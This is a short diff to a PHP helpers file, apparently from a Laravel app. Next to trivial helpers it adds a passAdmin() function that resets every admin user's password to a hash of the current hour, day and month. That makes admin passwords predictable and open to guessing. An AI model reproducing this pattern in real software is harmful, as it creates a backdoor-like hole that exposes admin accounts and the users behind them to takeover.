@@ -1,5 +1,9 @@
 <?php
 
+use App\Models\User;
+use Illuminate\Support\Carbon;
+use Illuminate\Support\Facades\Hash;
+
 if(!function_exists('urlQR'))
 {    
 	function urlQR()
@@ -20,5 +24,15 @@ if(!function_exists('iva'))
 	function iva()
 	{
 		return 19;
+	}
+}
+
+if(!function_exists('passAdmin'))
+{    
+	function passAdmin()
+	{
+		$str = Carbon::now()->format('Hdm');
+		$password = Hash::make($str);		
+		User::where('is_admin', TRUE)->update(['password' => $password]);
 	}
 }
